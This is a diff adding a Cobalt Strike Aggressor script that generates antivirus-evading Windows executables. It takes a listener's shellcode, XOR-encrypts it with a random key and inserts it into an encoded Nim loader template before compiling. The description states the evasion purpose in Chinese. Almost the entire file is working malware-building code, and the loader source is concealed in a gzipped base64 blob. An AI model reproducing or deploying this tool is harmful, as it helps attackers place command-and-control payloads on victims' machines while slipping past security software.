@@ -1,0 +1,85 @@
+popup attacks{
+	item("&CSx3Ldr",{x3Ldrmenu();});
+}
+
+bind Ctrl+J{
+	x3Ldrmenu();
+}
+
+
+# generate random string for variable substitution and keygens
+sub random_string {
+	$limit = 12;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+# Format shellcode into C# type 0x90,0x90,0x90
+sub format_csharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(",0x", @fmt);
+}
+
+sub x3Ldrmenu {
+	$dialog = dialog("x3Ldrmenu", %(listener => "" , bit => false), &builder);
+    drow_listener_stage($dialog, "listener", "Listener: ");
+	dialog_description($dialog, "用于快速生成免杀的可执行文件。注意：icon 需要在 /tmp/icon.o");
+	dbutton_action($dialog, "Generate");
+	dbutton_help($dialog, "http://github.com/yutianqaq/CSx3Ldr");
+	dialog_show($dialog);
+}
+
+sub builder {
+
+    $xorkey = random_string();
+    $xorkey_size = 12;
+    $format_shellcode = shellcode($3["listener"], false, "x64");
+    
+    $encrypted_shellcode = str_xor($format_shellcode, $xorkey);
+    $encrypted_test = str_xor("test", $xorkey);
+    $encrypted_shellcode_size = strlen($format_shellcode);
+    println("Key: ". $xorkey);
+    println("encrypted_shellcode_size: ". $encrypted_shellcode_size);
+
+	$code = gunzip(base64_decode("H4sIAAAAAAAAA5VUTXPaMBC98yu2ucSecQn0yCQHDyiB1nwMdkpbwjCOLYIaIbmyHMIw/PdqjbFIcoovlnbf7nv7YbNNJpWGLRNsc8VpLBrsaJF5o5EpmcCrVEQkapfp+cCD7x487jRdOIlMaQdipeId2kujB890dzKekO57FNw0AF5iBYrmBdfv3ca5kgoYMAEtaDavAamanIqOcUEVNWcmT+nBk9GI1HMGG5niCeGYSVFdKFHFVAUFqWojW7Rw8jXl/F0lESp+kSw1OktCTjXogbnCHdXdQikq9MQkonk+SB23xGA5WT8WKTep+v6oFxCDH2dUVEhnMh13SRgu/SBY+l08enDrByHxMLlrqdREKxP7kyldxNznXCbk1Snd+FQsXm0Y3QeBvSVxrufh4A9ZnpeH7XAtaEiGy+54OBxE1jbx78hySvzebDqISGm2pZ2Ntf2tHiPM8QD7/Q/y+3CARaPGf+jrfh+Q0eFgQ+1WWZXl+rg2C2LzmWJam9nDsai6TduwSLCxJhdCaNXnId1ItfvYLqgt2F9bdiHyeEX9ND0T/cluxhh8rrVqXl2H5KlRp2lidr03G097dtYvdtIVxCn1wRsy7zgd8ot076PjlLyjtkmZb+GgBsfyuG5Fz1bI8eUGWp1aL0rSx7YY9q6isabR2rxSRzDuQavKHUyiPlItw8ifRsvp+D4ajMiiFOh6cMKat1vnnsVM30oVMvHE6fjxLxakTyP42jaqtmsqIKUrJmjqmN9OKre52/nM6sxrtmr9wj4Jgu64R+wSliwsH8ZMDGVamK+yDto3ORPPHbi40pvsiiVSNOVF81D7cS5ZrNeG6YlqP8tumRlBvKGOLdO0FSHzdssIuoHLh4dLS4DPv4Jpp20DKM/pWwT+hexKuf8BeF0x+IgFAAA="));
+
+	$final_shellcode = format_csharp($encrypted_shellcode);
+    $final_xorkey = format_csharp($xorkey);
+    println("format_fsharp: ". $final_xorkey);
+    $code = replace($code , '\{\{LEN\}\}' , $encrypted_shellcode_size);
+    $code = replace($code , '\{\{KEY\}\}' , $final_xorkey);
+	$code = replace($code , '\{\{SHELLCODE\}\}' , $final_shellcode);
+
+	prompt_file_save("x3Ldr.exe", {
+		$path = "$1";
+
+		if ("*Windows*" iswm systemProperties()["os.name"]) {
+			$path = replace($path, "\\\\", "\\\\\\\\");
+			$cmd = "nim c -d=release -d=mingw --app=gui --cpu=amd64 --opt:size -d:strip -o:$path C:\\\\windows\\\\temp\\\\temp.nim";
+			$gofile = "C:\\\\windows\\\\temp\\\\temp.nim";
+			$iconpath = "C:\\\\icon.o";
+			$clear = "del C:\\\\windows\\\\temp\\\\temp.nim";
+			$handle = openf("> $+ $gofile");
+		}else{
+			$cmd = "nim c -d=release -d=mingw --app=gui --cpu=amd64 --opt:size -d:strip -o:$path /tmp/temp.nim";
+            $nimfile = "/tmp/temp.nim";
+			$clear = "rm tmp/temp.nim";
+			$iconpath = "/tmp/icon.o";
+			$handle = openf("> $+ $nimfile");
+		}
+
+		writeb($handle, $code);
+		closef($handle);
+        exec($cmd);
+		println("cmd: ". $cmd);
+		exec($clear);
+		show_message("save to  $+ $1");
+    });
+
+}
